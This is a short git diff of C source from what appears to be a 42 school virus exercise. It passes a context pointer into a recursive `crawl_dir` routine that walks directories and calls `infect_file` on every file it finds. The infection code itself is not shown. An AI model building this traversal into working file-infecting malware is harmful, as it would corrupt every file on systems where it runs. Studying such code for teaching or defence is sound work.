@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/04/13 17:53:33 by mbatty            #+#    #+#             */
-/*   Updated: 2026/04/13 18:12:35 by mbatty           ###   ########.fr       */
+/*   Updated: 2026/04/14 18:04:41 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -39,7 +39,7 @@ char	*strjoin(char const *s1, char const *s2)
 	return ((char *)dest);
 }
 
-int	crawl_dir(const char *path)
+int	crawl_dir(const char *path, t_ctx *ctx)
 {
 	struct dirent	*dirent = NULL;
 	DIR				*dir = opendir(path);
@@ -65,12 +65,12 @@ int	crawl_dir(const char *path)
 
 			if (dirent->d_type == DIRENT_DIRECTORY)
 			{
-				if (crawl_dir(new_path) == -1)
+				if (crawl_dir(new_path, ctx) == -1)
 					goto _loop_error;
 			}
 			else
 			{
-				if (infect_file(new_path) == -1)
+				if (infect_file(ctx, new_path) == -1)
 					goto _loop_error;
 			}
 
